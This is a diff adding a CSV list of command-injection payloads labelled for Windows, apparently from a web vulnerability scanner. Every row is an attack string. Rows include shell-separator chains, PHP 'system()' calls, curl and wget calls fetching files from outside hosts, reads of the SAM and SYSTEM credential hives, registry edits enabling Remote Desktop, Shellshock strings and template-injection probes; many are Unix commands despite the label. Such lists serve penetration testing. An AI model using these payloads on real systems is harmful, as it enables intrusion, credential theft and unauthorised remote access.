+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",Command Injection,Windows
+:phpversion();,Command Injection,Windows
+`ping 127.0.0.1`,Command Injection,Windows
+& ping -i 30 127.0.0.1 &,Command Injection,Windows
+& ping -n 30 127.0.0.1 &,Command Injection,Windows
+;${@print(md5(RCEVulnerable))};,Command Injection,Windows
+"${@print(""RCEVulnerable"")}",Command Injection,Windows
+${@print(system($_SERVER['HTTP_USER_AGENT']))},Command Injection,Windows
+pwd,Command Injection,Windows
+| pwd,Command Injection,Windows
+; pwd,Command Injection,Windows
+& pwd,Command Injection,Windows
+&& pwd,Command Injection,Windows
+\r,Command Injection,Windows
+"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",Command Injection,Windows
+"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",Command Injection,Windows
+"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",Command Injection,Windows
+"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",Command Injection,Windows
+"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",Command Injection,Windows
+\r\n,Command Injection,Windows
+route,Command Injection,Windows
+| sleep 1,Command Injection,Windows
+; sleep 1,Command Injection,Windows
+& sleep 1,Command Injection,Windows
+&& sleep 1,Command Injection,Windows
+sleep 1,Command Injection,Windows
+|| sleep 10,Command Injection,Windows
+| sleep 10,Command Injection,Windows
+; sleep 10,Command Injection,Windows
+{${sleep(10)}},Command Injection,Windows
+& sleep 10 ,Command Injection,Windows
+&& sleep 10,Command Injection,Windows
+sleep 10,Command Injection,Windows
+|| sleep 15,Command Injection,Windows
+| sleep 15,Command Injection,Windows
+; sleep 15,Command Injection,Windows
+& sleep 15 ,Command Injection,Windows
+&& sleep 15,Command Injection,Windows
+ {${sleep(20)}},Command Injection,Windows
+{${sleep(20)}},Command Injection,Windows
+ {${sleep(3)}},Command Injection,Windows
+{${sleep(3)}},Command Injection,Windows
+| sleep 5,Command Injection,Windows
+; sleep 5,Command Injection,Windows
+& sleep 5,Command Injection,Windows
+&& sleep 5,Command Injection,Windows
+sleep 5,Command Injection,Windows
+ {${sleep(hexdec(dechex(20)))}} ,Command Injection,Windows
+{${sleep(hexdec(dechex(20)))}} ,Command Injection,Windows
+sysinfo,Command Injection,Windows
+| sysinfo,Command Injection,Windows
+; sysinfo,Command Injection,Windows
+& sysinfo,Command Injection,Windows
+&& sysinfo,Command Injection,Windows
+system('cat C:\boot.ini');,Command Injection,Windows
+system('cat config.php');,Command Injection,Windows
+|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,Command Injection,Windows
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,Command Injection,Windows
+; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,Command Injection,Windows
+& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,Command Injection,Windows
+&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,Command Injection,Windows
+system('curl https://crowdshield.com/.testing/rce_vuln.txt'),Command Injection,Windows
+system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),Command Injection,Windows
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,Command Injection,Windows
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),Command Injection,Windows
+systeminfo,Command Injection,Windows
+| systeminfo,Command Injection,Windows
+; systeminfo,Command Injection,Windows
+& systeminfo,Command Injection,Windows
+&& systeminfo,Command Injection,Windows
+system('ls'),Command Injection,Windows
+system('pwd'),Command Injection,Windows
+system('pwd');,Command Injection,Windows
+|| system('sleep 5');,Command Injection,Windows
+| system('sleep 5');,Command Injection,Windows
+; system('sleep 5');,Command Injection,Windows
+& system('sleep 5');,Command Injection,Windows
+&& system('sleep 5');,Command Injection,Windows
+system('sleep 5'),Command Injection,Windows
+system('sleep 5');,Command Injection,Windows
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),Command Injection,Windows
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,Command Injection,Windows
+system('whoami'),Command Injection,Windows
+system('whoami');,Command Injection,Windows
+test*; ls -lhtR /var/www/,Command Injection,Windows
+"test* || perl -e 'print ""X""x16096'",Command Injection,Windows
+"test* | perl -e 'print ""X""x16096'",Command Injection,Windows
+"test* & perl -e 'print ""X""x16096'",Command Injection,Windows
+"test* && perl -e 'print ""X""x16096'",Command Injection,Windows
+"test*; perl -e 'print ""X""x16096'",Command Injection,Windows
+$(`type C:\boot.ini`),Command Injection,Windows
+&&type C:\\boot.ini,Command Injection,Windows
+| type C:\Windows\repair\SAM,Command Injection,Windows
+; type C:\Windows\repair\SAM,Command Injection,Windows
+& type C:\Windows\repair\SAM,Command Injection,Windows
+&& type C:\Windows\repair\SAM,Command Injection,Windows
+type C:\Windows\repair\SAM,Command Injection,Windows
+| type C:\Windows\repair\SYSTEM,Command Injection,Windows
+; type C:\Windows\repair\SYSTEM,Command Injection,Windows
+& type C:\Windows\repair\SYSTEM,Command Injection,Windows
+&& type C:\Windows\repair\SYSTEM,Command Injection,Windows
+type C:\Windows\repair\SYSTEM,Command Injection,Windows
+| type C:\WINNT\repair\SAM,Command Injection,Windows
+; type C:\WINNT\repair\SAM,Command Injection,Windows
+& type C:\WINNT\repair\SAM,Command Injection,Windows
+&& type C:\WINNT\repair\SAM,Command Injection,Windows
+type C:\WINNT\repair\SAM,Command Injection,Windows
+type C:\WINNT\repair\SYSTEM,Command Injection,Windows
+| type %SYSTEMROOT%\repair\SAM,Command Injection,Windows
+; type %SYSTEMROOT%\repair\SAM,Command Injection,Windows
+& type %SYSTEMROOT%\repair\SAM,Command Injection,Windows
+&& type %SYSTEMROOT%\repair\SAM,Command Injection,Windows
+type %SYSTEMROOT%\repair\SAM,Command Injection,Windows
+| type %SYSTEMROOT%\repair\SYSTEM,Command Injection,Windows
+; type %SYSTEMROOT%\repair\SYSTEM,Command Injection,Windows
+& type %SYSTEMROOT%\repair\SYSTEM,Command Injection,Windows
+&& type %SYSTEMROOT%\repair\SYSTEM,Command Injection,Windows
+type %SYSTEMROOT%\repair\SYSTEM,Command Injection,Windows
+uname,Command Injection,Windows
+;uname;,Command Injection,Windows
+| uname -a,Command Injection,Windows
+; uname -a,Command Injection,Windows
+& uname -a,Command Injection,Windows
+&& uname -a,Command Injection,Windows
+uname -a,Command Injection,Windows
+|/usr/bin/id,Command Injection,Windows
+;|/usr/bin/id|,Command Injection,Windows
+;/usr/bin/id|,Command Injection,Windows
+$;/usr/bin/id,Command Injection,Windows
+"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",Command Injection,Windows
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,Command Injection,Windows
+| wget http://crowdshield.com/.testing/rce.txt,Command Injection,Windows
+& wget http://crowdshield.com/.testing/rce.txt,Command Injection,Windows
+; wget https://crowdshield.com/.testing/rce_vuln.txt,Command Injection,Windows
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),Command Injection,Windows
+&& wget https://crowdshield.com/.testing/rce_vuln.txt,Command Injection,Windows
+wget https://crowdshield.com/.testing/rce_vuln.txt,Command Injection,Windows
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),Command Injection,Windows
+which curl,Command Injection,Windows
+which gcc,Command Injection,Windows
+which nc,Command Injection,Windows
+which netcat,Command Injection,Windows
+which perl,Command Injection,Windows
+which python,Command Injection,Windows
+which wget,Command Injection,Windows
+whoami,Command Injection,Windows
+| whoami,Command Injection,Windows
+; whoami,Command Injection,Windows
+' whoami,Command Injection,Windows
+' || whoami,Command Injection,Windows
+' & whoami,Command Injection,Windows
+' && whoami,Command Injection,Windows
+'; whoami,Command Injection,Windows
+""" whoami",Command Injection,Windows
+""" || whoami",Command Injection,Windows
+""" | whoami",Command Injection,Windows
+""" & whoami",Command Injection,Windows
+""" && whoami",Command Injection,Windows
+"""; whoami",Command Injection,Windows
+$(`whoami`),Command Injection,Windows
+& whoami,Command Injection,Windows
+&& whoami,Command Injection,Windows
+"{{ get_user_file(""C:\boot.ini"") }}",Command Injection,Windows
+"{{ get_user_file(""/etc/hosts"") }}",Command Injection,Windows
+{{4+4}},Command Injection,Windows
+{{4+8}},Command Injection,Windows
+{{person.secret}},Command Injection,Windows
+{{person.name}},Command Injection,Windows
+{1} + {1},Command Injection,Windows
+"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",Command Injection,Windows
+{{[] .__ Class __.__ base __.__ subclasses __ ()}},Command Injection,Windows
